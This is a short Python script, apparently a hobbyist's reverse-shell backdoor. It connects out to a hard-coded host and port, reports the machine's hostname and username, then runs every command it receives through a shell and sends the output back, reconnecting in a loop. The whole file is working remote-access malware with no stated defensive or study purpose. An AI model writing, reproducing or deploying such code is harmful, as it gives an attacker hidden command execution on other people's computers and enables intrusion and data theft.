import os, socket, subprocess, time

host = "10.0.0.1" # should be public ip, but i cant port forward so ive got to use this
port = 12345

notif = "Connection Established: " + socket.gethostname() + " > " + os.getenv("username")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connected = False
connection_interval = 5

def connect():
    print("Trying to connect...")

    try:
        s.connect((host, port))
        s.send(notif.encode("utf-8"))
        print("Connected!")
        return True

    except:
        return False

while True:
    while not connected:
        connected = connect()
        time.sleep(connection_interval)

    data = s.recv(1024).decode("utf-8")

    print(data)

    if not data:
        print("No connection")
        connected = False
        continue

    if data == "exit":
        print("Closing connection")
        s.close()
        connected = False
        continue

    #print(data)

    proc = subprocess.Popen(data, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
    stdout_value = proc.stdout.read() + proc.stderr.read()

    s.send(stdout_value)

print("Loop exited, somehow!")
